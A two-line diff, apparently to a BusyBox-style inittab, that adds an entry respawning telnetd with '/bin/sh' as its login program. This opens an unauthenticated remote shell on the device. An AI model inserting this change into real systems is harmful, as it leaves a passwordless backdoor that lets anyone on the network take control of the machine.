@@ -1,1 +1,2 @@
 ttyS0::respawn:/bin/sh
+ttyS0::respawn:/bin/telnetd -l /bin/sh -F
